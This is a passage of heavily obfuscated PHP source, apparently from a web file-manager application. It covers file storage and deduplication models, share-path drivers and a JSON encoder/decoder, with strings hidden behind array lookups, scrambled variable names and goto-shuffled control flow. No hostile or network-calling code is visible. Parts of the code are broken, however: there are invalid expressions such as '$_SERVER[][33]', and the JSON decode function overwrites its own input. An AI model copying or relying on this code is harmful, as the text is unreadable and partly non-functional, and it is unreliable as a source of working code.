if ($d[$B[2039]]) { $d[$B[2040]] = array($B[921], intval($d[$B[2039]])); } unset($d[$B[2039]]); } if (isset($d[$B[2041]])) { if ($d[$B[2041]]) { $d[$B[2040]] = array($B[918], intval($d[$B[2041]])); } unset($d[$B[2041]]); } return $this->_listData($d); } private function _listData($fڊ) { $bӇȆ =& $_SERVER[놫Ӱ]; $C = $this->where($fڊ)->_makeOrder()->selectPage(100); $this->_listAppendParent($C[$bӇȆ[350]]); $this->_listAppendUser($C[$bӇȆ[350]]); $this->_listAppendMeta($C[$bӇȆ[350]]); return $C; } private function _makeOrder() { $fȦ =& $_SERVER[놫Ӱ]; $E퉴 = array($fȦ[2035], $fȦ[2032], $fȦ[184]); $F٭ = Input::get($fȦ[403], $fȦ[7], $fȦ[386], $E퉴); $d = Input::get($fȦ[404], $fȦ[7], $fȦ[1332], array($fȦ[2042], $fȦ[401])); $F񫋦 = $F٭ . $fȦ[50] . $d; return $this->order($F񫋦); } private function _listAppendParent(&$dʟл) { goto A; A: $Cކ =& $_SERVER[놫Ӱ]; $CΗݓ = array_unique(array_to_keyvalue($dʟл, $Cކ[33], $Cކ[2030])); $CΗݓ = array_remove_value($CΗݓ, $Cކ[464]); goto b⮑; b⮑: if (!$CΗݓ) { return; } $Dʘ = $this->where(array($Cކ[2031] => array($Cކ[7], $CΗݓ)))->select(); $Dʘ = array_to_keyvalue($Dʘ, $Cކ[2040]); goto a; a: foreach ($dʟл as &$cƐޙ) { if (isset($Dʘ[$cƐޙ[$Cކ[2030]]])) { $cƐޙ[$Cކ[2043]] = $Dʘ[$cƐޙ[$Cކ[2030]]]; } } goto F߷; F߷: } private function _listAppendUser(&$Fɹ) { goto c; c: $fÉ =& $_SERVER[놫Ӱ]; $F΢ = array_unique(array_to_keyvalue($Fɹ, $fÉ[33], $fÉ[1339])); $F΢ = array_remove_value($F΢, $fÉ[464]); goto A; A: if (count($F΢) == 0) { return; } foreach ($Fɹ as $Dă) { if (isset($Dă[$fÉ[2043]])) { $F΢[] = $Dă[$fÉ[2043]][$fÉ[1339]]; } } $C = Model($fÉ[469])->userListInfo($F΢); goto B; B: foreach ($Fɹ as &$Dă) { $Dă[$fÉ[527]] = $C[$Dă[$fÉ[1339]]]; if (isset($Dă[$fÉ[2043]])) { $Dă[$fÉ[2043]][$fÉ[527]] = $C[$Dă[$fÉ[2043]][$fÉ[1339]]]; } } goto a; a: } private function _listAppendMeta(&$C) { goto C±; eϖ: if (!$B) { return; } foreach ($C as $B) { if (isset($B[$Aȝ[2043]])) { $B[] = $B[$Aȝ[2043]][$Aȝ[2040]]; } } $Bɷ׼ = $this->metaList($B); goto A͢; C±: $Aȝ =& $_SERVER[놫Ӱ]; $B = array_unique(array_to_keyvalue($C, $Aȝ[33], $Aȝ[2040])); $B = array_remove_value($B, $Aȝ[464]); goto eϖ; A͢: if (!$Bɷ׼) { return !1; } foreach ($C as &$B) { $B[$Aȝ[413]] = $Bɷ׼[$B[$Aȝ[2040]]]; if (isset($B[$Aȝ[2043]])) { $B[$Aȝ[2043]][$Aȝ[413]] = $Bɷ׼[$B[$Aȝ[2043]][$Aȝ[2040]]]; } } goto bɷ; bɷ: } private function metaList($bЈϔ) { goto f앙; f앙: $fʕ =& $_SERVER[놫Ӱ]; if (!$bЈϔ) { return array(); } $FŨ = array($fʕ[2040] => array($fʕ[7], $bЈϔ)); goto FԔ; a: return $Cⱘ ? $Cⱘ : array(); goto bШ; FԔ: $Cⱘ = Model($fʕ[2044])->where($FŨ)->select(); $Cⱘ = array_to_keyvalue_group($Cⱘ, $fʕ[2040]); foreach ($Cⱘ as $A => $c¿) { $Fԩ֝ = array(); foreach ($c¿ as $B) { $Fԩ֝[$B[$fʕ[88]]] = $B[$fʕ[354]]; } $Cⱘ[$A] = $Fԩ֝; } goto a; bШ: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\x6c\145"; protected $tableMeta = array("\x74\141\142\154\145\116\141\x6d\x65" => "\x69\x6f\x5f\146\151\x6c\x65\x5f\x6d\145\x74\141", "\x6d\145\164\141\106\x69\x65\154\x64" => "\x66\151\x6c\145\x49\104"); public function fileInfo($EĶˏ) { $DЄ툄 =& $_SERVER[놫Ӱ]; static $cݥ = array(); if (!isset($cݥ[$EĶˏ])) { $aӍ = $DЄ툄[2045]; $cö = Model($DЄ툄[418])->field($aӍ)->where(array($DЄ툄[416] => $EĶˏ))->find(); $cݥ[$EĶˏ] = $cö; } return $cݥ[$EĶˏ]; } public function addFileByContent($BƝć = '', $aΎ = '') { goto fߌ箇; d˕ֹ: $dް = $Fñ . $C򫌾Ǒ[2047] . rand_string(16); file_put_contents($dް, $BƝć); $c铊 = $this->addFile($dް, $aΎ, !0); goto D͹; fߌ箇: $C򫌾Ǒ =& $_SERVER[놫Ӱ]; $Fñ = TEMP_PATH . $C򫌾Ǒ[2046]; if (!is_dir($Fñ)) { mk_dir($Fñ); } goto d˕ֹ; D͹: if (file_exists($dް)) { @unlink($dް); } return $c铊; goto B͠Å; B͠Å: } public function createFileName($Dσ) { goto Fڅ; AԤ: $F煱 = $dǻ->pathFather($cӢ); static $f¢ = false; $a = $D˱[2048] . md5($F煱); goto Fզڎ; Fڅ: $D˱ =& $_SERVER[놫Ӱ]; $dǻ = IO::init($D˱[8]); $cӢ = $this->makeFilePath($Dσ, $dǻ); goto AԤ; Fզڎ: if (!$f¢ && !Cache::get($a)) { $f¢ = !0; $d١ = IO::mkdir($F煱); if (!IO::exist($d١ . $D˱[2049])) { IO::mkfile($d١ . $D˱[2049]); } Cache::set($a, 1, 3600 * 2); } return $cӢ; goto CӼɎ; CӼɎ: } public function makeFilePath($C, $c) { goto Cᅾ; a⮦: switch ($Fڽ) { case $c忰ؚ[2053]: $B␑ = $B␑ . $c忰ؚ[92] . $c->ext($C); if ($c->ext($C) == $c忰ؚ[1992]) { $B␑ .= $c忰ؚ[2054]; } break; case $c忰ؚ[2055]: goto D숨; f̓ԍ: break; goto b೅; D숨: $D߰ƛ = Model($c忰ؚ[1055])->get($c忰ؚ[2056]); $F֓ = substr(md5($c忰ؚ[1813] . $D߰ƛ . date($c忰ؚ[672])), 0, 8); $dؘʴ = KodIO::defaultIO() . date($c忰ؚ[2057]) . $F֓ . $c忰ؚ[8]; goto A╌; A╌: if ($c->ext($C) == $c忰ؚ[1992]) { $C .= $c忰ؚ[2054]; } $bĶ = IO::fileNameAuto($dؘʴ, $C); $B␑ = $dؘʴ . $bĶ; goto f̓ԍ; b೅: case $c忰ؚ[2052]: break; default: break; } return $B␑; goto Fꋐ; eЈ: $B␑ = $dؘʴ . rand_string(5) . short_id(100); $C = str_replace($c忰ؚ[8], $c忰ؚ[71], KodIO::clear($C)); if (!$C) { $Fڽ = $c忰ؚ[2052]; } goto a⮦; Cᅾ: $c忰ؚ =& $_SERVER[놫Ӱ]; $Fڽ = Model($c忰ؚ[1055])->get($c忰ؚ[2050]); $dؘʴ = KodIO::defaultIO() . date($c忰ؚ[2051]); goto eЈ; Fꋐ: } public function addFileByRemote($E밯ތ, $eӲ, $E蕭 = array()) { goto E; B: if ($FꚄ = $this->addFileCheckExist($E[$CД٫[161]], $E[$CД٫[160]], $E[$CД٫[78]])) { return $FꚄ; } return $this->addFileData($E); goto Dݝ; E: $CД٫ =& $_SERVER[놫Ӱ]; if (!IO::exist($E밯ތ)) { return !1; } $E = $E蕭[$CД٫[160]] ? $E蕭[$CД٫[160]] : $CД٫[33]; goto Aڽ; Aڽ: $Cė = IO::hashMd5($E밯ތ, $E); $d = KodIO::defaultDriver(); $E = array($CД٫[513] => IO::size($E밯ތ), $CД٫[2058] => 1, $CД٫[383] => $eӲ, $CД٫[731] => $d[$CД٫[364]], $CД٫[384] => $E밯ތ, $CД٫[2059] => $E蕭[$CД٫[161]] ? $E蕭[$CД٫[161]] : IO::hashSimple($E밯ތ), $CД٫[2060] => $Cė ? $Cė : $E); goto B; Dݝ: } private function addFileData($CŞ) { $dƖȫ =& $_SERVER[놫Ӱ]; $CŞ[$dƖȫ[78]] = intval($CŞ[$dƖȫ[78]]); if (!$CŞ[$dƖȫ[78]] && strlen($CŞ[$dƖȫ[161]]) > 32) { $CŞ[$dƖȫ[78]] = intval(substr($CŞ[$dƖȫ[161]], 32)); } $E쭋 = $this->add($CŞ); return $this->find($E쭋); } public function addFile($BЫդ, $C͝؟, $bڃ롎 = false) { $FҢċ = IO::hashSimple($BЫդ); $Eৗ = IO::hashMd5($BЫդ); $e̓ = IO::size($BЫդ); if ($Dϐŭ = $this->addFileCheckExist($FҢċ, $Eৗ, $e̓)) { return $Dϐŭ; } $D䆧 = $this->addFileMake($BЫդ, $e̓, $FҢċ, $Eৗ, $C͝؟, $bڃ롎); return $this->addFileData($D䆧); } public function addFileMake($e򾅵, $f˱, $aСȷݿ, $eÛ, $cϾÌ, $a܂) { $bʇ =& $_SERVER[놫Ӱ]; $E = $this->createFileName($cϾÌ); if ($a܂) { IO::move($e򾅵, $E); } else { IO::copy($e򾅵, $E); } $Dþ = KodIO::defaultDriver(); $D = array($bʇ[513] => $f˱, $bʇ[2058] => 1, $bʇ[383] => $cϾÌ, $bʇ[731] => $Dþ[$bʇ[364]], $bʇ[384] => $E, $bʇ[2059] => $aСȷݿ, $bʇ[2060] => $eÛ); return $D; } public function addFileCheckExist($f񄅢Ԕ, $C͐݅, $a븂) { $bψմ =& $_SERVER[놫Ӱ]; $A = $this->findByHash($f񄅢Ԕ, $C͐݅); if (!$A) { return !1; } $AΚ = array($bψմ[2058] => intval($A[$bψմ[2061]]) + 1, $bψմ[513] => $a븂); $this->where(array($bψմ[416] => $A[$bψմ[415]]))->save($AΚ); return $A; } public function remove($e) { $this->linkCountChange($e, !1); $this->clearEmpty(); return !0; } public function linkAdd($D) { $this->linkCountChange($D, !0); } public function linkCountChange($b, $C숏) { goto Eӓ; Eӓ: $A =& $_SERVER[놫Ӱ]; if (!$b) { return; } if (!is_array($b)) { $b = array($b); } goto D; d臜: foreach ($bߚ as $Aϯ => $AӦ) { $F = $AӦ . $A[33]; if (!$E򂮔[$F]) { $E򂮔[$F] = array(); } $E򂮔[$F][] = $Aϯ; } foreach ($E򂮔 as $AӦ => $b̲) { if (!$b̲) { continue; } $AӦ = $C숏 ? $AӦ : -intval($AӦ); $cŉ = array($A[415] => array($A[7], $b̲)); if ($AӦ < 0) { $cŉ[$A[2061]] = array($A[922], abs($AӦ)); } $this->where($cŉ)->setAdd($A[2061], $AӦ); } goto cʣ; D: $bߚ = array(); foreach ($b as $Aϯ) { $F = $Aϯ . $A[33]; if (!$bߚ[$F]) { $bߚ[$F] = 0; } $bߚ[$F]++; } $E򂮔 = array(); goto d臜; cʣ: } public function findByHash($b, $CξЍ = false) { $BΊף =& $_SERVER[놫Ӱ]; if (!$b && !$CξЍ) { return !1; } $Fع = array($BΊף[2059] => $b); if ($CξЍ) { $Fع = array($BΊף[2060] => $CξЍ); } return $this->order($BΊף[2062])->where($Fع)->find(); } public function clearEmpty($cە = 0) { goto BČ; E˫: foreach ($cˤ as $B擠) { $C->update(1); $this->resetFile($B擠); } $C->end(); goto Bϊޯ; cğ: $cˤ = $this->where($B횶)->select(); if (!$cˤ) { return; } $C = new Task($DӎԶ[2064], $DӎԶ[33], count($cˤ)); goto E˫; BČ: $DӎԶ =& $_SERVER[놫Ӱ]; $CҐ = time() - 3600 * 24 * $cە; $B횶 = $DӎԶ[2063] . $CҐ; goto cğ; Bϊޯ: } public function refreshData() { goto eΖհ; eΖհ: $dңބ =& $_SERVER[놫Ӱ]; $this->refreshSourceHistory(); $aߐ = $this->select(); goto f艦Խ; Aޔᴥ: $c->end(); $this->clearEmpty(); goto F; f艦Խ: if (!$aߐ) { return; } $c = new Task($dңބ[2065], $dңބ[33], count($aߐ)); foreach ($aߐ as $B) { $c->update(1); if ($this->removeNotExist($B)) { continue; } $this->resetFile($B); } goto Aޔᴥ; F: } private function resetFile($E̓) { goto D; Fʴ: $Bñ = Model($Cނ[2066])->where($DӑÑ)->count(); $d = intval($dԮ) + intval($Bñ); if ($d == 0) { IO::remove($E̓[$Cނ[76]]); $this->where($DӑÑ)->delete(); $this->metaSet($E̓[$Cނ[415]], null, null); return; } goto D䞻; D: $Cނ =& $_SERVER[놫Ӱ]; $DӑÑ = array($Cނ[416] => $E̓[$Cނ[415]]); $dԮ = Model($Cނ[1075])->where($DӑÑ)->count(); goto Fʴ; D䞻: if ($E̓[$Cނ[2061]] != $d) { $this->where($DӑÑ)->save(array($Cނ[2058] => $d)); } goto A򡟡Ӟ; A򡟡Ӟ: } private function removeNotExist($cͶ) { goto D; E綄: return !0; goto B; D: $B񴟷Փ =& $_SERVER[놫Ӱ]; if (IO::exist($cͶ[$B񴟷Փ[76]])) { return !1; } $this->remove($cͶ[$B񴟷Փ[415]]); goto Dԗ; Dԗ: $fǨذ = array($B񴟷Փ[416] => $cͶ[$B񴟷Փ[415]]); Model($B񴟷Փ[1075])->where($fǨذ)->delete(); Model($B񴟷Փ[2066])->where($fǨذ)->delete(); goto E綄; B: } private function refreshSourceHistory() { $c =& $_SERVER[놫Ӱ]; $aۜ = Model($c[2067])->select(); if (!$aۜ) { return; } foreach ($aۜ as $C) { $d = array($c[380] => $C[$c[366]]); if (!Model($c[1075])->where($d)->find()) { Model($c[2067])->where($d)->delete(); } } } public function storageInfo($B²雜 = false) { goto F; C: for ($Aх = 0; $Aх < $dʧƸ; $Aх = $Aх + $fл) { $Bڏ = $this->limit($Aх, $Aх + $fл)->select(); foreach ($Bڏ as $A̱ͬ) { $dƂŋ += $A̱ͬ[$E[78]] * $A̱ͬ[$E[2061]]; $cՍ += $A̱ͬ[$E[78]] * ($A̱ͬ[$E[2061]] - 1); $c += $A̱ͬ[$E[2061]]; } } $bĐ = array($E[2068] => $dƂŋ, $E[2069] => $cՍ, $E[2070] => $cՍ / $dƂŋ, $E[82] => $dʧƸ, $E[2071] => $c); return $bĐ; goto E; EǺ޻: $dƂŋ = 1; $c = 0; $fл = 5000; goto C; F: $E =& $_SERVER[놫Ӱ]; $dʧƸ = $this->count() + 0.0; $cՍ = 0; goto EǺ޻; E: } } goto CꝌ; A: register_shutdown_function($_SERVER[][33]); set_error_handler($_SERVER[][46], $b); if (function_exists($_SERVER[][47])) { set_exception_handler($_SERVER[][48]); } goto e; F֌ۧӬ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($a؎ȥ) { $this->pathParse = $a؎ȥ; $this->model = Model($_SERVER[놫Ӱ][1075]); } public function getPathOuter($a焗跟) { $D =& $_SERVER[놫Ӱ]; if (!$a焗跟) { return $a焗跟; } $E = $this->parse($a焗跟); return trim(KodIO::makeShare($this->pathParse[$D[364]], $E[$D[364]]), $D[8]); } protected function infoParse($CØģ, $aۖ = false, $Ȩ = false) { $a =& $_SERVER[놫Ӱ]; $cߪ = $this->pathParse[$a[364]]; $D۳ = trim($this->pathParse[$a[983]], $a[8]); return Action($a[1081])->sharePathInfo($cߪ, $D۳); } public function infoFull($b˘) { return $this->infoParse($b˘); } public function listAll($b󐍶) { goto c; B: $D疍 = $this->model->listAll($b󐍶); $a = Model($e[528])->getInfo($d[$e[437]]); $Cٻ = Action($e[1081]); goto b㵣; c: $e =& $_SERVER[놫Ӱ]; $d = IO::info($this->pathParse[$e[76]]); if (!$d) { return array(); } goto B; b㵣: foreach ($D疍 as &$B) { check_abort(); $B[$e[388]] = $Cٻ->_shareItemeParse($B[$e[388]], $a); } return $D疍; goto CИ; CИ: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b) { $this->pathParse = $b; $this->model = Model($_SERVER[놫Ӱ][1075]); } protected function infoParse($Eȏ, $b槵 = false, $c = false) { $c򯓅 =& $_SERVER[놫Ӱ]; return Action($c򯓅[989])->sharePathInfo($this->pathParse[$c򯓅[76]], !0); } public function listAll($Fߎ) { $aʇ =& $_SERVER[놫Ӱ]; $FÞ = IO::info($this->pathParse[$aʇ[76]]); if (!$FÞ) { return array(); } $BԪ = $this->model->listAll($Fߎ); foreach ($BԪ as &$E޳) { $E޳[$aʇ[388]] = Action($aʇ[989])->itemInfo($E޳[$aʇ[388]]); $E = substr($E޳[$aʇ[76]], strpos(ltrim($E޳[$aʇ[76]], $aʇ[8]), $aʇ[8]) + 1); $E޳[$aʇ[388]][$aʇ[76]] = $this->pathParse[$aʇ[984]] . $E; } return $BԪ; } } class PathDriverDriverShareItem { public function __construct($Fґ) { $this->pathParse = $Fґ; } public function __call($bӌ, $fЄ) { $c޶ڍ =& $_SERVER[놫Ӱ]; if (method_exists($this, $bӌ)) { return; } $d捍״ = call_user_func_array(array($c޶ڍ[1082], $bӌ), $fЄ); $Cܽ퍟 = array($c޶ڍ[1083], $c޶ڍ[1084], $c޶ڍ[1085], $c޶ڍ[1086], $c޶ڍ[482], $c޶ڍ[484], $c޶ڍ[1087], $c޶ڍ[90], $c޶ڍ[1088], $c޶ڍ[1089]); if (in_array($bӌ, $Cܽ퍟)) { $d捍״ = $this->getPathOuter($d捍״); } return $d捍״; } public function copy($fϙ, $aڐ, $fŪՌ = false) { return $this->copyMove($fϙ, $aڐ, $fŪՌ, $_SERVER[놫Ӱ][482]); } public function move($B씔, $bĞұ, $cߺ = false) { return $this->copyMove($B씔, $bĞұ, $cߺ, $_SERVER[놫Ӱ][484]); } private function copyMove($f嘴, $A톱, $A, $Bǝ) { goto b; DꮔĬ: if ($Fɦ->pathParse[$Dۡ[969]]) { $A톱 = $Fɦ->pathParse[$Dۡ[969]]; } else { $A톱 = $Fؤ; } $B = IO::copyMove($f嘴, $A톱, $A, $Bǝ); $B = $this->getPathOuter($B); goto bЙ׵; b: $Dۡ =& $_SERVER[놫Ӱ]; $Fؤ = $A톱; $Fɦ = IO::driverMake($A톱); goto DꮔĬ; bЙ׵: return $B; goto Eު玐; Eު玐: } public function pathFather($c) { return get_path_father($this->pathParse[$_SERVER[놫Ӱ][76]]); } public function iconvSystem($fԢڈ) { return $fԢڈ; } protected function infoParse($E܄) { $C㙈ʺ =& $_SERVER[놫Ӱ]; $a = $this->pathParse[$C㙈ʺ[435]][$C㙈ʺ[990]] . $this->pathParse[$C㙈ʺ[983]]; $cލ쓯 = IO::info($a); $dݲ = $this->pathParse[$C㙈ʺ[435]]; return Action($C㙈ʺ[1081])->_shareItemeParse($cލ쓯, $dݲ); } public function listAll($FƿՖ) { $aؗ =& $_SERVER[놫Ӱ]; $eջ = IO::listAll($FƿՖ); $e悘 = $this->pathParse[$aؗ[435]]; foreach ($eջ as &$Aډ؉) { check_abort(); $Aډ؉ = array_merge(IO::info($Aډ؉[$aؗ[76]]), $Aډ؉); $Aډ؉[$aؗ[388]] = Action($aؗ[1081])->_shareItemeParse($Aډ؉, $e悘); } return $eջ; } public function getPathOuter($dÆ) { goto cϗ̐; cϗ̐: $C΅ =& $_SERVER[놫Ӱ]; $F = KodIO::parse($dÆ); if ($F[$C΅[29]] == KodIO::KOD_SHARE_ITEM) { return $F[$C΅[76]]; } goto eɺ; eɺ: $f = KodIO::clear($dÆ); $f蹴 = KodIO::clear($this->pathParse[$C΅[435]][$C΅[990]]); $Cʑ = substr($f, strlen($f蹴)); goto c݃; c݃: if (substr($f, 0, strlen($f蹴)) != $f蹴) { return !1; } return $this->pathParse[$C΅[984]] . $C΅[8] . ltrim($Cʑ, $C΅[8]); goto CɌ; CɌ: } public function getType() { $Aŧ =& $_SERVER[놫Ӱ]; $C = str_replace($Aŧ[72], $Aŧ[33], get_class($this)); return strtolower($C); } public function isTypeObject($B۴) { return IO::isTypeObject($B۴); } public function info($A삳) { return $this->infoParse($A삳); } public function infoAuth($EȐ) { return $this->infoParse($EȐ); } public function infoWithChildren($aޖ筋) { return $this->infoParse($aޖ筋); } public function infoFull($D) { return $this->infoParse($D); } } goto Fҋܯ; F: define($_SERVER[놫Ӱ][1836], 16); define($_SERVER[놫Ӱ][1837], 32); class Services_JSON { function __construct($D = 0) { $this->use = $D; } function utf162utf8($c̭) { $f΋ =& $_SERVER[놫Ӱ]; if (function_exists($f΋[69])) { return mb_convert_encoding($c̭, $f΋[1487], $f΋[1838]); } $A = ord($c̭[0]) << 8 | ord($c̭[1]); switch (!0) { case (127 & $A) == $A: return chr(127 & $A); case (2047 & $A) == $A: return chr(192 | $A >> 6 & 31) . chr(128 | $A & 63); case (65535 & $A) == $A: return chr(224 | $A >> 12 & 15) . chr(128 | $A >> 6 & 63) . chr(128 | $A & 63); } return $f΋[33]; } function utf82utf16($bɪՠ) { $Fҝ =& $_SERVER[놫Ӱ]; if (function_exists($Fҝ[69])) { return mb_convert_encoding($bɪՠ, $Fҝ[1838], $Fҝ[1487]); } switch (strlen($bɪՠ)) { case 1: return $bɪՠ; case 2: return chr(7 & ord($bɪՠ[0]) >> 2) . chr(192 & ord($bɪՠ[0]) << 6 | 63 & ord($bɪՠ[1])); case 3: return chr(240 & ord($bɪՠ[0]) << 4 | 15 & ord($bɪՠ[1]) >> 2) . chr(192 & ord($bɪՠ[1]) << 6 | 127 & ord($bɪՠ[2])); } return $Fҝ[33]; } function encode($e쌄) { $AЦŸ =& $_SERVER[놫Ӱ]; switch (gettype($e쌄)) { case $AЦŸ[1498]: return $e쌄 ? $AЦŸ[1497] : $AЦŸ[1499]; case $AЦŸ[1839]: return $AЦŸ[100]; case $AЦŸ[300]: return (int) $e쌄; case $AЦŸ[275]: case $AЦŸ[274]: return (double) $e쌄; case $AЦŸ[309]: $CÏ = $AЦŸ[33]; $aÏ = strlen($e쌄); for ($E = 0; $E < $aÏ; ++$E) { $dڴʎ = ord($e쌄[$E]); switch (!0) { case $dڴʎ == 8: $CÏ .= $AЦŸ[1840]; break; case $dڴʎ == 9: $CÏ .= $AЦŸ[1474]; break; case $dڴʎ == 10: $CÏ .= $AЦŸ[1472]; break; case $dڴʎ == 12: $CÏ .= $AЦŸ[1841]; break; case $dڴʎ == 13: $CÏ .= $AЦŸ[1473]; break; case $dڴʎ == 34: case $dڴʎ == 47: case $dڴʎ == 92: $CÏ .= $AЦŸ[94] . $e쌄[$E]; break; case $dڴʎ >= 32 && $dڴʎ <= 127: $CÏ .= $e쌄[$E]; break; case ($dڴʎ & 224) == 192: $E߃ԩ = pack($AЦŸ[1842], $dڴʎ, ord($e쌄[$E + 1])); $E += 1; $Aόܕ = $this->utf82utf16($E߃ԩ); $CÏ .= sprintf($AЦŸ[1843], bin2hex($Aόܕ)); break; case ($dڴʎ & 240) == 224: $E߃ԩ = pack($AЦŸ[1842], $dڴʎ, ord($e쌄[$E + 1]), ord($e쌄[$E + 2])); $E += 2; $Aόܕ = $this->utf82utf16($E߃ԩ); $CÏ .= sprintf($AЦŸ[1843], bin2hex($Aόܕ)); break; case ($dڴʎ & 248) == 240: $E߃ԩ = pack($AЦŸ[1842], $dڴʎ, ord($e쌄[$E + 1]), ord($e쌄[$E + 2]), ord($e쌄[$E + 3])); $E += 3; $Aόܕ = $this->utf82utf16($E߃ԩ); $CÏ .= sprintf($AЦŸ[1843], bin2hex($Aόܕ)); break; case ($dڴʎ & 252) == 248: $E߃ԩ = pack($AЦŸ[1842], $dڴʎ, ord($e쌄[$E + 1]), ord($e쌄[$E + 2]), ord($e쌄[$E + 3]), ord($e쌄[$E + 4])); $E += 4; $Aόܕ = $this->utf82utf16($E߃ԩ); $CÏ .= sprintf($AЦŸ[1843], bin2hex($Aόܕ)); break; case ($dڴʎ & 254) == 252: $E߃ԩ = pack($AЦŸ[1842], $dڴʎ, ord($e쌄[$E + 1]), ord($e쌄[$E + 2]), ord($e쌄[$E + 3]), ord($e쌄[$E + 4]), ord($e쌄[$E + 5])); $E += 5; $Aόܕ = $this->utf82utf16($E߃ԩ); $CÏ .= sprintf($AЦŸ[1843], bin2hex($Aόܕ)); break; } } return $AЦŸ[112] . $CÏ . $AЦŸ[112]; case $AЦŸ[1844]: if (is_array($e쌄) && count($e쌄) && array_keys($e쌄) !== range(0, sizeof($e쌄) - 1)) { $C㊺ = array_map(array($this, $AЦŸ[1845]), array_keys($e쌄), array_values($e쌄)); foreach ($C㊺ as $Bى) { if (Services_JSON::isError($Bى)) { return $Bى; } } return $AЦŸ[1037] . join($AЦŸ[47], $C㊺) . $AЦŸ[312]; } $bўӍ = array_map(array($this, $AЦŸ[1846]), $e쌄); foreach ($bўӍ as $Aʮᎏ) { if (Services_JSON::isError($Aʮᎏ)) { return $Aʮᎏ; } } return $AЦŸ[154] . join($AЦŸ[47], $bўӍ) . $AЦŸ[468]; case $AЦŸ[1847]: $Dق = get_object_vars($e쌄); $C㊺ = array_map(array($this, $AЦŸ[1845]), array_keys($Dق), array_values($Dق)); foreach ($C㊺ as $Bى) { if (Services_JSON::isError($Bى)) { return $Bى; } } return $AЦŸ[1037] . join($AЦŸ[47], $C㊺) . $AЦŸ[312]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $AЦŸ[100] : new Services_JSON_Error(gettype($e쌄) . $AЦŸ[1848]); } } function name_value($D, $aɂՉ) { $F = $this->encode($aɂՉ); if (Services_JSON::isError($F)) { return $F; } return $this->encode(strval($D)) . $_SERVER[놫Ӱ][4] . $F; } function reduce_string($aӗ) { $c֗ܙ =& $_SERVER[놫Ӱ]; $aӗ = preg_replace(array($c֗ܙ[1849], $c֗ܙ[1850], $c֗ܙ[1851]), $c֗ܙ[33], $aӗ); return trim($aӗ); } function decode($D) { $D =& $_SERVER[놫Ӱ]; $D = $this->reduce_string($D); switch (strtolower($D)) { case $D[1497]: return !0; case $D[1499]: return !1; case $D[100]: return null; default: $DǞș = array(); if (is_numeric($D)) { return (double) $D == (int) $D ? (int) $D : (double) $D; } elseif (preg_match($D[1852], $D, $DǞș) && $DǞș[1] == $DǞș[2]) { $Dנ = substr($D, 0, 1); $eЄ = substr($D, 1, -1); $cǑ = $D[33]; $d = strlen($eЄ); for ($eӉѸ = 0; $eӉѸ < $d; ++$eӉѸ) { $B㏤ý = substr($eЄ, $eӉѸ, 2); $Fħƙ = ord($eЄ[$eӉѸ]); switch (!0) { case $B㏤ý == $D[1840]: $cǑ .= chr(8); ++$eӉѸ; break; case $B㏤ý == $D[1474]: $cǑ .= chr(9); ++$eӉѸ; break; case $B㏤ý == $D[1472]: $cǑ .= chr(10); ++$eӉѸ; break; case $B㏤ý == $D[1841]: $cǑ .= chr(12); ++$eӉѸ; break; case $B㏤ý == $D[1473]: $cǑ .= chr(13); ++$eӉѸ; break; case $B㏤ý == $D[1249]: case $B㏤ý == $D[1853]: case $B㏤ý == $D[1467]: case $B㏤ý == $D[1469]: if ($Dנ == $D[112] && $B㏤ý != $D[1853] || $Dנ == $D[55] && $B㏤ý != $D[1249]) { $cǑ .= $eЄ[++$eӉѸ]; } break; case preg_match($D[1854], substr($eЄ, $eӉѸ, 6)): $bΈ = chr(hexdec(substr($eЄ, $eӉѸ + 2, 2))) . chr(hexdec(substr($eЄ, $eӉѸ + 4, 2))); $cǑ .= $this->utf162utf8($bΈ); $eӉѸ += 5; break; case $Fħƙ >= 32 && $Fħƙ <= 127: $cǑ .= $eЄ[$eӉѸ]; break; case ($Fħƙ & 224) == 192: $cǑ .= substr($eЄ, $eӉѸ, 2); ++$eӉѸ; break; case ($Fħƙ & 240) == 224: $cǑ .= substr($eЄ, $eӉѸ, 3); $eӉѸ += 2; break; case ($Fħƙ & 248) == 240: $cǑ .= substr($eЄ, $eӉѸ, 4); $eӉѸ += 3; break; case ($Fħƙ & 252) == 248: $cǑ .= substr($eЄ, $eӉѸ, 5); $eӉѸ += 4; break; case ($Fħƙ & 254) == 252: $cǑ .= substr($eЄ, $eӉѸ, 6); $eӉѸ += 5; break; } } return $cǑ; } elseif (preg_match($D[1855], $D) || preg_match($D[1856], $D)) { goto D˽·; D˽·: if ($D[0] == $D[154]) { $BԿ = array(SERVICES_JSON_IN_ARR); $A = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $BԿ = array(SERVICES_JSON_IN_OBJ); $Aֹ = array(); } else { $BԿ = array(SERVICES_JSON_IN_OBJ); $Aֹ = new stdClass(); } } array_push($BԿ, array($D[1857] => SERVICES_JSON_SLICE, $D[260] => 0, $D[1858] => !1)); $eЄ = substr($D, 1, -1); goto bٲͲ; AΧ: for ($eӉѸ = 0; $eӉѸ <= $d; ++$eӉѸ) { $Aҫӌ = end($BԿ); $B㏤ý = substr($eЄ, $eӉѸ, 2); if ($eӉѸ == $d || $eЄ[$eӉѸ] == $D[47] && $Aҫӌ[$D[1857]] == SERVICES_JSON_SLICE) { $Bۆ = substr($eЄ, $Aҫӌ[$D[260]], $eӉѸ - $Aҫӌ[$D[260]]); array_push($BԿ, array($D[1857] => SERVICES_JSON_SLICE, $D[260] => $eӉѸ + 1, $D[1858] => !1)); if (reset($BԿ) == SERVICES_JSON_IN_ARR) { array_push($A, $this->decode($Bۆ)); } elseif (reset($BԿ) == SERVICES_JSON_IN_OBJ) { $F˙ی = array(); if (preg_match($D[1859], $Bۆ, $F˙ی)) { $cّҫ = $this->decode($F˙ی[1]); $D欌 = $this->decode($F˙ی[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Aֹ[$cّҫ] = $D欌; } else { $Aֹ->{$cّҫ} = $D欌; } } elseif (preg_match($D[1860], $Bۆ, $F˙ی)) { $cّҫ = $F˙ی[1]; $D欌 = $this->decode($F˙ی[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $Aֹ[$cّҫ] = $D欌; } else { $Aֹ->{$cّҫ} = $D欌; } } } } elseif (($eЄ[$eӉѸ] == $D[112] || $eЄ[$eӉѸ] == $D[55]) && $Aҫӌ[$D[1857]] != SERVICES_JSON_IN_STR) { array_push($BԿ, array($D[1857] => SERVICES_JSON_IN_STR, $D[260] => $eӉѸ, $D[1858] => 